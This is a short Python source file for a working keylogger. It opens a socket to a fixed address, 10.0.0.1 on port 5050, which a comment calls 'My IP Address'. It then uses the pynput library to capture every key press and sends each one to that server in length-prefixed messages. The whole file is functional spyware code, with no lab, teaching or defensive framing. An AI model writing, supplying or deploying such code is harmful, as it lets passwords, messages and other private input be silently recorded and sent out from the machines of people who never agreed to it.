import socket
from pynput.keyboard import Key, Listener

HEADER = 64
PORT = 5050
FORMAT = "UTF-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "10.0.0.1"  # My IP Address
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b" " * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)


def press(key):
    try:
        send(f"{key.char}")
    except AttributeError:
        send(f"{key}")


with Listener(on_press=press) as listener:
    listener.join()
